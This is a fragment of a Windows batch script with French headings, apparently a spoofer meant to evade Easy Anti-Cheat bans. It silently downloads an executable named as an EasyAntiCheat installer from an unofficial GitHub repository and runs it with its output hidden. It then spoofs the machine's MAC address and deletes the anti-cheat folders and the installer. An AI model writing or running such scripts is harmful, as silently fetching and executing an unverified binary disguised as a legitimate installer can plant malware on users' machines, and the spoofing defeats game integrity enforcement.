...
set "URL=https://github.com/eykoqlf/spf/raw/refs/heads/main/EasyAntiCheat_EOS_Setup.exe"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'EasyAntiCheat_EOS_Setup.exe' -UseBasicParsing" >nul 2>&1

:: ==================== 3. INSTALLATION ====================
if exist "EasyAntiCheat_EOS_Setup.exe" (
    EasyAntiCheat_EOS_Setup.exe install a4a57ff548934dbeba0cc7c62cdf9f34 >nul 2>&1
)

:: ==================== 4. SPOOF MAC ALÉATOIRE ====================
CALL :MAC
...
rd /s /q "EasyAntiCheat" >nul 2>&1
rd /s /q "EasyAntiCheat_EOS" >nul 2>&1
del /q "EasyAntiCheat_EOS_Setup.exe" >nul 2>&1
